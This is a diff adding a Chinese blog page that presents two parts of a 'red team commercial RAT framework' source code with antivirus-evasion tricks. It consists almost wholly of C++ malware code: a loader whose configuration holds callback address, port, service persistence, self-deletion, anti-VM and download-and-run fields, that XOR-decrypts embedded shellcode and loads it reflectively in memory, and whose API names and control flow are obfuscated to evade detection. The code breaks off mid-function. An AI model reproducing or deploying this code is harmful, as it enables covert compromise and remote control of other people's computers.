@@ -1,0 +1,2683 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Hexo">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Hexo</title>
+    <link rel="icon" type="image/png" href="../../../../../../../favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../css/matery.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../css/my.css">
+
+    <script src="../../../../../../../libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="../../../../../../../index.html" class="waves-effect waves-light">
+                    
+                    <img src="../../../../../../../medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../index.html" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="../../../../../../../medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../index.html" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../../../../medias/featureimages/0.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title"></h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="../../../../../../../libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-07-16
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.2k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    25 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="../../../../../../../libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="红队商业版RAT框架源码免杀解读（一）"><a href="#红队商业版RAT框架源码免杀解读（一）" class="headerlink" title="红队商业版RAT框架源码免杀解读（一）"></a>红队商业版RAT框架源码免杀解读（一）</h2><pre class="line-numbers language-none"><code class="language-none">// Loader.cpp : Defines the entry point for the application.
+//
+
+#include "stdafx.h"
+#include "ShellCode.h"
+#include "MemLoadDll.h"
+
+//配置信息结构体
+struct MODIFY_DATA
+{
+	TCHAR szDns[300];		//上线地址
+	TCHAR dwPort[32];		//上线端口
+	TCHAR szGroup[50];		//上线分组
+	TCHAR szVersion[32];	//上线版本
+	TCHAR szGetGroup[256];	//分组唯一标识
+	BOOL  bRunOnce;         //是否为绿色安装
+	BOOL  bRuns;            //是否是启动目录启动
+	BOOL  bService;         //是否是服务启动
+	TCHAR SerName[100];     //服务名称
+ 	TCHAR Serdisplay[128];  //显示名称
+ 	TCHAR Serdesc[256];     //服务描述
+ 	TCHAR ReleasePath[100]; //安装途径
+ 	TCHAR ReleaseName[50];  //安装名称
+	WORD FileAttribute;      //文件属性
+	BOOL  bLanPenetrate;    //超级复活
+	CHAR Mexi[100];          //运行互斥
+	WORD  Dele_zd;          //安装增大
+	BOOL Dele_te;            //安装自删除
+	BOOL Fvm;            //vm
+	BOOL Dele_fs;            //占坑防删除安装
+	BOOL Fhb;           //哈波
+	BOOL Zjz;
+	BOOL fsc;
+	CHAR szDownRun[512];   //下载运行地址
+}modify_data = 
+{
+	"           D         ",
+		"",
+		"",
+		"",
+		"",
+		TRUE,			//TRUE为绿色安装，FALSE为标准安装
+		TRUE,			//TRUE为启动目录启动
+	    TRUE,			//TRUE为服务启动
+		"",
+		"",
+		"",
+		"",
+		"",
+		FILE_ATTRIBUTE_NORMAL,    //文件属性
+		FALSE,
+		"Cao360",
+		0,
+		FALSE,
+		FALSE,
+		FALSE,
+		FALSE,
+		FALSE,
+		FALSE,
+		"",
+};
+
+void DecrypMain(char *Buff, int Size, char *AddTable)
+{
+	for (int i=0, j=0; i&lt;Size; i++)
+	{
+		Buff[i] ^= AddTable[j++] % 1753 + 79;
+
+		if (i % 5 == 0)
+			j = 0;
+	}
+}
+unsigned char MyFileTabLe[] = {0xBE, 0x16, 0xCF, 0x52, 0xCD};
+
+typedef int (WINAPI *Fuck)(MODIFY_DATA,LPCTSTR lpData);
+//typedef BOOL (* MyDLL)();
+void Fuck_OFF( const char *name,LPSTR LpData)
+{
+
+
+		HMEMORYMODULE hDll;
+		Fuck pfn;
+
+		try
+		{
+			if(1+1==2)throw 93;
+		}
+		catch (...)
+		{
+			DecrypMain((char *)g_ShellCodeFileBuff, g_ShellCodeFileSize, (char *)MyFileTabLe);
+
+		}
+
+
+//		DecryptData((unsigned char *)g_ShellCodeFileBuff,g_ShellCodeFileSize,1987);
+
+		try
+		{
+			if(1+1==2)throw 36;
+		}
+		catch (...)
+		{
+			hDll=MemoryLoadLibrary(g_ShellCodeFileBuff);
+		}
+
+
+
+		try
+		{
+			if(1+1==2)throw 39;
+		}
+		catch (...)
+		{
+			Sleep(20);
+		}
+
+		if (hDll==NULL)
+		return ;
+		try
+		{
+			if(1+1==2)throw 29;
+		}
+		catch (...)
+		{
+
+			try
+			{
+				if(1+1==2)throw 97;
+			}
+			catch (...)
+			{
+				pfn=(Fuck)MemoryGetProcAddress(hDll,name);
+			}
+
+			if (pfn==NULL)
+			{
+
+				try
+				{
+					if(1+1==2)throw 82;
+				}
+				catch (...)
+				{
+					MemoryFreeLibrary(hDll);
+				}
+
+				return;
+			}
+			pfn(modify_data,LpData);
+			if (hDll!=NULL)
+			{
+
+				try
+				{
+					if(1+1==2)throw 85;
+				}
+				catch (...)
+				{
+					MemoryFreeLibrary(hDll);
+				}
+
+
+				try
+				{
+					if(1+1==2)throw 36;
+				}
+				catch (...)
+				{
+					hDll=NULL;
+				}
+
+
+			}
+
+			try
+			{
+				if(1+1==2)throw 33;
+			}
+			catch (...)
+			{
+				ExitProcess(0);
+			}
+
+		}
+
+}
+int APIENTRY WinMain(HINSTANCE hInstance,
+                     HINSTANCE hPrevInstance,
+                     LPSTR     lpCmdLine,
+                     int       nCmdShow)
+{
+ 	// TODO: Place code here.
+	char shellex[]={'S','h','e','l','l','e','x','\0'};
+	Fuck_OFF(shellex,"");
+    //return 0;
+	return 0;
+}
+
+
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="红队商业版RAT框架源码免杀解读（二）"><a href="#红队商业版RAT框架源码免杀解读（二）" class="headerlink" title="红队商业版RAT框架源码免杀解读（二）"></a>红队商业版RAT框架源码免杀解读（二）</h2><pre class="line-numbers language-none"><code class="language-none">#ifndef IMAGE_SIZEOF_BASE_RELOCATION
+// Vista SDKs no longer define IMAGE_SIZEOF_BASE_RELOCATION!?
+#define IMAGE_SIZEOF_BASE_RELOCATION (sizeof(IMAGE_BASE_RELOCATION))
+#endif
+#pragma warning( disable : 4311 4312 )
+
+#include &lt;Windows.h&gt;
+#include &lt;winnt.h&gt;
+#include &lt;Windows.h&gt;
+#include &lt;TCHAR.H&gt;
+typedef void *HMEMORYMODULE;
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+
+HMEMORYMODULE MemoryLoadLibrary(const void *);
+
+FARPROC MemoryGetProcAddress(HMEMORYMODULE, const char *);
+
+void MemoryFreeLibrary(HMEMORYMODULE);
+
+#ifdef __cplusplus
+}
+#endif
+
+typedef struct {
+	PIMAGE_NT_HEADERS headers;
+	unsigned char *codeBase;
+	HMODULE *modules;
+	int numModules;
+	int initialized;
+} MEMORYMODULE, *PMEMORYMODULE;
+
+typedef BOOL (WINAPI *DllEntryProc)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);
+
+#define GET_HEADER_DICTIONARY(module, idx)	&amp;(module)-&gt;headers-&gt;OptionalHeader.DataDirectory[idx]
+
+///-------------------------------------------MyFunctions
+__declspec(naked) char __fastcall upcaseA(char c)
+{
+	__asm
+	{
+		mov al, cl
+			cmp al, 'a'
+			jl m1
+			cmp al, 'z'
+			jg m1
+			and al, 0xdf
+m1:
+		retn
+	}
+}
+
+int __fastcall strcmpiA(const char *s1, const char *s2)
+{
+	unsigned long k = 0;
+	unsigned char c1, c2;
+	do
+	{
+		c1 = upcaseA(s1[k]);
+		c2 = upcaseA(s2[k]);
+		if (c1 &gt; c2)
+		{
+
+			return 1;
+		}
+		else if (c1 &lt; c2)
+		{
+
+			return -1;
+		};
+
+		k++;
+	} while ((c1 | c2) != 0);
+
+	return 0;
+}
+
+void myfree(void *p)
+{
+	typedef BOOL
+		(WINAPI
+		*HeapFreeT)(
+		__inout HANDLE hHeap,
+		__in    DWORD dwFlags,
+		__deref LPVOID lpMem
+		);
+	char AOiHr[] = {'H','e','a','p','F','r','e','e','\0'};
+	char dcCRF[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
+	HeapFreeT pHeapFree=(HeapFreeT)GetProcAddress(LoadLibrary("kernel32.dll"),"HeapFree");
+
+	typedef HANDLE
+		(WINAPI
+		*GetProcessHeapT)(
+		VOID
+		);
+	char GWcOq[] = {'G','e','t','P','r','o','c','e','s','s','H','e','a','p','\0'};
+	GetProcessHeapT pGetProcessHeap=(GetProcessHeapT)GetProcAddress(LoadLibrary(dcCRF),GWcOq);
+
+    pHeapFree(pGetProcessHeap(), 0, p);
+}
+
+
+////------------------------------------
+
+static void CopySections(const unsigned char *data, PIMAGE_NT_HEADERS old_headers, PMEMORYMODULE module)
+{
+	typedef LPVOID
+		(WINAPI
+		*VirtualAllocT)(
+		__in_opt LPVOID lpAddress,
+		__in     SIZE_T dwSize,
+		__in     DWORD flAllocationType,
+		__in     DWORD flProtect
+		);
+	char uitgn[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
+	char qyasB[] = {'V','i','r','t','u','a','l','A','l','l','o','c','\0'};
+	VirtualAllocT pVirtualAlloc=(VirtualAllocT)GetProcAddress(LoadLibrary("kernel32.dll"),"VirtualAlloc");
+
+
+	int i, size;
+	unsigned char *codeBase = module-&gt;codeBase;
+	unsigned char *dest;
+	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(module-&gt;headers);
+	for (i=0; i&lt;module-&gt;headers-&gt;FileHeader.NumberOfSections; i++, section++)
+	{
+		if (section-&gt;SizeOfRawData == 0)
+		{
+			// section doesn't contain data in the dll itself, but may define
+			// uninitialized data
+			size = old_headers-&gt;OptionalHeader.SectionAlignment;
+			if (size &gt; 0)
+			{
+				dest = (unsigned char *)VirtualAlloc(codeBase + section-&gt;VirtualAddress,
+					size,
+					MEM_COMMIT,
+					PAGE_READWRITE);
+
+
+				section-&gt;Misc.PhysicalAddress = (DWORD)dest;
+				memset(dest, 0, size);
+			}
+
+
+			// section is empty
+			continue;
+		}
+
+
+
+		// commit memory block and copy data from dll
+		dest = (unsigned char *)VirtualAlloc(codeBase + section-&gt;VirtualAddress,
+							section-&gt;SizeOfRawData,
+							MEM_COMMIT,
+							PAGE_READWRITE);
+
+
+
+		try
+		{
+			if(1+1==2)throw 85;
+		}
+		catch (...)
+		{
+			memcpy(dest, data + section-&gt;PointerToRawData, section-&gt;SizeOfRawData);
+
+		}
+
+	section-&gt;Misc.PhysicalAddress = (DWORD)dest;
+
+	}
+
+}
+void *myrealloc(void *p, size_t size)
+{
+	typedef LPVOID
+		(WINAPI
+		*HeapReAllocT)(
+		__inout HANDLE hHeap,
+		__in    DWORD dwFlags,
+		__deref LPVOID lpMem,
+		__in    SIZE_T dwBytes
+		);
+	char lygUR[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
+	char gfKIk[] = {'H','e','a','p','R','e','A','l','l','o','c','\0'};
+	HeapReAllocT pHeapReAlloc=(HeapReAllocT)GetProcAddress(LoadLibrary("kernel32.dll"),"HeapReAlloc");
+
+	typedef LPVOID
+		(WINAPI
+		*HeapAllocT)(
+		__in HANDLE hHeap,
+		__in DWORD dwFlags,
+		__in SIZE_T dwBytes
+		);
+	char nGOQF[] = {'H','e','a','p','A','l','l','o','c','\0'};
+	HeapAllocT pHeapAlloc=(HeapAllocT)GetProcAddress(LoadLibrary("kernel32.dll"),"HeapAlloc");
+
+	typedef HANDLE
+		(WINAPI
+		*GetProcessHeapT)(
+		VOID
+		);
+	char GWcOq[] = {'G','e','t','P','r','o','c','e','s','s','H','e','a','p','\0'};
+	GetProcessHeapT pGetProcessHeap=(GetProcessHeapT)GetProcAddress(LoadLibrary("kernel32.dll"),"GetProcessHeap");
+
+
+    if (p)
+        return pHeapReAlloc(pGetProcessHeap(), 0, p, size);
+    else
+        return pHeapAlloc(pGetProcessHeap(), 0, size);
+}
+// Protection flags for memory pages (Executable, Readable, Writeable)
+static int ProtectionFlags[2][2][2] = 
+{
+	{
+		// not executable
+		{PAGE_NOACCESS, PAGE_WRITECOPY},
+		{PAGE_READONLY, PAGE_READWRITE},
+	}, {
+		// executable
+		{PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY},
+		{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE},
+	},
+};
+
+static void FinalizeSections(PMEMORYMODULE module)
+{
+	typedef BOOL
+		(WINAPI
+		*VirtualFreeT)(
+		__in LPVOID lpAddress,
+		__in SIZE_T dwSize,
+		__in DWORD dwFreeType
+		);
+
+	VirtualFreeT pVirtualFree=(VirtualFreeT)GetProcAddress(LoadLibrary("kernel32.dll"),"VirtualFree");
+
+
+	typedef BOOL
+		(WINAPI
+		*VirtualProtectT)(
+		__in  LPVOID lpAddress,
+		__in  SIZE_T dwSize,
+		__in  DWORD flNewProtect,
+		__out PDWORD lpflOldProtect
+		);
+	char nOVLO[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t','\0'};
+	VirtualProtectT pVirtualProtect=(VirtualProtectT)GetProcAddress(LoadLibrary("kernel32.dll"),"VirtualProtect");
+
+	int i;
+	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(module-&gt;headers);
+
+
+	// loop through all sections and change access flags
+	for (i=0; i&lt;module-&gt;headers-&gt;FileHeader.NumberOfSections; i++, section++)
+	{
+		DWORD protect, oldProtect, size;
+		int executable = (section-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) != 0;
+		int readable =   (section-&gt;Characteristics &amp; IMAGE_SCN_MEM_READ) != 0;
+		int writeable =  (section-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE) != 0;
+
+		if (section-&gt;Characteristics &amp; IMAGE_SCN_MEM_DISCARDABLE)
+		{
+			// section is not needed any more and can safely be freed
+			pVirtualFree((LPVOID)section-&gt;Misc.PhysicalAddress, section-&gt;SizeOfRawData, MEM_DECOMMIT);
+			continue;
+		}
+
+
+
+		// determine protection flags based on characteristics
+		protect = ProtectionFlags[executable][readable][writeable];
+		if (section-&gt;Characteristics &amp; IMAGE_SCN_MEM_NOT_CACHED)
+			protect |= PAGE_NOCACHE;
+
+
+
+		// determine size of region
+		size = section-&gt;SizeOfRawData;
+		if (size == 0)
+		{
+			if (section-&gt;Characteristics &amp; IMAGE_SCN_CNT_INITIALIZED_DATA)
+				size = module-&gt;headers-&gt;OptionalHeader.SizeOfInitializedData;
+			else if (section-&gt;Characteristics &amp; IMAGE_SCN_CNT_UNINITIALIZED_DATA)
+				size = module-&gt;headers-&gt;OptionalHeader.SizeOfUninitializedData;
+		}
+
+
+
+		if (size &gt; 0)
+		{
+			// change memory access flags
+			if (pVirtualProtect((LPVOID)section-&gt;Misc.PhysicalAddress, section-&gt;SizeOfRawData, protect, &amp;oldProtect) == 0)
+			{
+				//OutputLastError("Error protecting memory page");
+
+
+
+			}
+		}
+	}
+}
+
+static void PerformBaseRelocation(PMEMORYMODULE module, DWORD delta)
+{
+	DWORD i;
+	unsigned char *codeBase = module-&gt;codeBase;
+
+	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_BASERELOC);
+	if (directory-&gt;Size &gt; 0)
+	{
+		PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)(codeBase + directory-&gt;VirtualAddress);
+		for (; relocation-&gt;VirtualAddress &gt; 0; )
+		{
+			unsigned char *dest = (unsigned char *)(codeBase + relocation-&gt;VirtualAddress);
+			unsigned short *relInfo = (unsigned short *)((unsigned char *)relocation + IMAGE_SIZEOF_BASE_RELOCATION);
+			for (i=0; i&lt;((relocation-&gt;SizeOfBlock-IMAGE_SIZEOF_BASE_RELOCATION) / 2); i++, relInfo++)
+			{
+				DWORD *patchAddrHL;
+				int type, offset;
+
+				// the upper 4 bits define the type of relocation
+				type = *relInfo &gt;&gt; 12;
+				// the lower 12 bits define the offset
+				offset = *relInfo &amp; 0xfff;
+
+
+				switch (type)
+				{
+				case IMAGE_REL_BASED_ABSOLUTE:
+					// skip relocation
+					break;
+
+				case IMAGE_REL_BASED_HIGHLOW:
+					// change complete 32 bit address
+					patchAddrHL = (DWORD *)(dest + offset);
+					*patchAddrHL += delta;
+					break;
+
+				default:
+					//printf("Unknown relocation: %d\n", type);
+					break;
+				}
+			}
+
+
+
+			// advance to next relocation block
+			relocation = (PIMAGE_BASE_RELOCATION)(((DWORD)relocation) + relocation-&gt;SizeOfBlock);
+		}
+	}
+}
+
+static int BuildImportTable(PMEMORYMODULE module)
+{
+	//	return 0;//201
+	typedef BOOL
+		(WINAPI
+		*IsBadReadPtrT)(
+		__in_opt CONST VOID *lp,
+		__in     UINT_PTR ucb
+		);
+	char scfXK[] = {'I','s','B','a','d','R','e','a','d','P','t','r','\0'};
+	char eYhRS[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
+	IsBadReadPtrT pIsBadReadPtr=(IsBadReadPtrT)GetProcAddress(LoadLibrary(eYhRS),scfXK);
+
+	//		return 0;//202
+
+	int result=1;
+	unsigned char *codeBase = module-&gt;codeBase;
+
